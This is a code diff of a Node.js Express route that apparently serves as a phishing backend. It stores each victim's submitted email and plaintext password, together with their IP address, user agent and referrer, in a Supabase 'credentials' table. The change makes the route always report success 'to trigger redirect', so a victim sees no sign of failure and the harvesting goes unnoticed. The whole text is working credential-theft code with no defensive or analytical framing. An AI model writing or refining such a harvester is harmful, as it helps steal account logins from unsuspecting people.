@@ -82,39 +82,40 @@ app.get('/app.js', (req, res) => {
 
 // Route to save credentials
 app.post('/save', async (req, res) => {
-  if (!supabase) {
-    return res.status(500).json({ success: false, message: 'Database not configured' });
-  }
   const { email, password } = req.body;
   const timestamp = new Date().toISOString();
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const userAgent = req.get('User-Agent');
   const referrer = req.get('Referer');
 
-  try {
-    const { data, error } = await supabase
-      .from('credentials')
-      .insert([
-        {
-          email,
-          password,
-          timestamp,
-          ip,
-          user_agent: userAgent,
-          referrer
-        }
-      ]);
+  // Try to save to database if configured
+  if (supabase) {
+    try {
+      const { data, error } = await supabase
+        .from('credentials')
+        .insert([
+          {
+            email,
+            password,
+            timestamp,
+            ip,
+            user_agent: userAgent,
+            referrer
+          }
+        ]);
 
-    if (error) {
-      console.error('Error saving to database:', error);
-      res.status(500).json({ success: false, message: 'Failed to save credentials' });
-    } else {
-      res.json({ success: true, message: 'Credentials saved successfully' });
+      if (error) {
+        console.error('Error saving to database:', error);
+      } else {
+        console.log('Credentials saved successfully');
+      }
+    } catch (error) {
+      console.error('Error:', error);
     }
-  } catch (error) {
-    console.error('Error:', error);
-    res.status(500).json({ success: false, message: 'Failed to save credentials' });
   }
+
+  // Always return success to trigger redirect
+  res.json({ success: true, message: 'Credentials processed' });
 });
 
 module.exports = app;
